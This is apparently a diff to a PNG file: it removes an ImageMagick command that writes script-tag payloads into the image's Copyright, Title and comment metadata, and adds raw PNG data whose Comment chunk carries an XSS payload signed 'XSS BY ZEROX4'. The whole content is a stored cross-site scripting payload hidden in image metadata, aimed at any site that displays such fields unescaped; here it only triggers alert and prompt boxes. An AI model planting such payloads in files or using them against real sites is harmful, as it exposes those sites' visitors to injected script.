@@ -1,2 +1,4 @@
-convert Head_red.png -set 'Copyright' '/><script>alert("1");</script>' -set 'Title' '/><script>alert("2");</script>' -set comment '/><script>alert("3");</script>' OUT.png
-</html>
+�PNG
+�
+IHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment"><script>alert(prompt('XSS BY ZEROX4'))</script>
+                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�
